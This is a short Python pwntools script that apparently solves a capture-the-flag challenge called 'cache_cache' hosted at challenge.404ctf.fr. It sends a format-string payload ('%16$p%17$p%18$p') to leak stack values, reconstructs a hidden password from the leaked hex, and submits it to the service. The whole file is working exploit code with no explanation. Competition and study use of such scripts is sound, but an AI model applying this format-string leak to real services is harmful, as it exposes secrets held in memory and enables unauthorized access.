#!/usr/bin/env python3

from pwn import *
from time import sleep

HOST = "challenge.404ctf.fr"
PORT = 31946

exe = ELF("./cache_cache")

context.log_level = 'info'
context.arch = 'amd64'
context.binary = exe.path
context.terminal = ["tmux", "new-window"]

if args.REMOTE:
    NL = b"\r\n"
else:
    NL = b"\n"

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process([exe.path])

    return r



def main():
    global r
    r = conn()

    rep = r.recvuntil(b':\n')
    print(rep)

    fmtstr = b'AAAAAAAA'  + b"%16$p%17$p%18$p"
    print(fmtstr)
    r.send(fmtstr + NL)

    leak = r.recv()

    passwd = leak.split(b'\n\n')[0].split(b'0x')[1:]

    print(passwd)

    p = ""

    for c in passwd:
        c = c.decode()
        c = bytes.fromhex(c)
        p += c.decode("ASCII")[::-1]

    print(p)
    print(len(p))

    r.send(p.encode() + NL)

    rep = r.recv()
    print(rep.decode())
    rep = r.recv()

    print(rep.decode())

if __name__ == "__main__":
    main()
